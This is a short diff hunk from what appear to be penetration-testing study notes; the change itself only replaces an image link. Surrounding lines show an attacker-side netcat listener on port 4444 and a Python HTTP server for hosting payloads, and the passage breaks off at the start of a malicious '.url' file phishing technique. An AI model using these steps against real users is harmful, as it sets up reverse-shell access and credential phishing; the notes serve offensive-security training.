@@ -63,7 +63,7 @@ know!
 Lhost: nc -nlvp 4444
 Lhost: python3 -m http.server
 ```
-https://offsec-platform-prod.s3.amazonaws.com/offsec-courses/PWKR/imgs/clientsideattacks/2ad68e3a33e8ba87b2a27876c2bbf6f5-csa_sc_createshortcut2.png
+![image](https://github.com/KiritoLoveAsuna/Penetration-Testing/assets/38044499/ddb6330f-410c-4fd5-ad65-0baf3f7e9a96)
 ### Url File Fishing
 ```
 1. Create file called "@hax.url" with following content:
